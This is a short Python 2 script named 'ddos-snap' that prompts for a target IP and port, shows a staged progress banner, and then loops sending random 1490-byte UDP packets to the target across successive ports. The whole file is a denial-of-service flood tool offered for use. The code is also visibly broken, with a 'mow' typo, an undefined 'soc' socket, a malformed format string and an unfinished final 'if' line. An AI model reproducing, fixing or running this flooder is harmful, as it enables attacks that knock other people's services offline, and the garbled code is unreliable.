# ddos-snap
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = mow.minute
day = now.day
month = now.month
year = now.year

###########
sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)
###########

os.system("clear")
os.system("figlet ddos-snap")
print
print "youtube : SNAP SNAP TH"
print "github : snap-ch-th"
print "facebook : 私は違います ピエロ"
print
ip = raw_input("IP TARGET :")
port = input("Enter port :")

os.system("clear")
os.system("figlet ddos-snap Running")
print "[+]--xxxx>                      [+] 0%"
time.sleep(2)
print "[+]--xxxxxxxx>                  [+] 25%"
time.sleep(2)
print "[+]--xxxxxxxxxxxxxxxx>          [+] 50%"
time.sleep(3)
print "[+]--xxxxxxxxxxxxxxxxx>         [+] 75%"
time.sleep(2)
print "[+]--xxxxxxxxxxxxxxxxxxxxxxxxx> [+] 100%"
time.sleep(2)
sent = 0
while True:
    soc.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print "SNAP :-Sent %s packet to %s throught port:%s%(sent,ip,port)"
    if port == 65534;
    
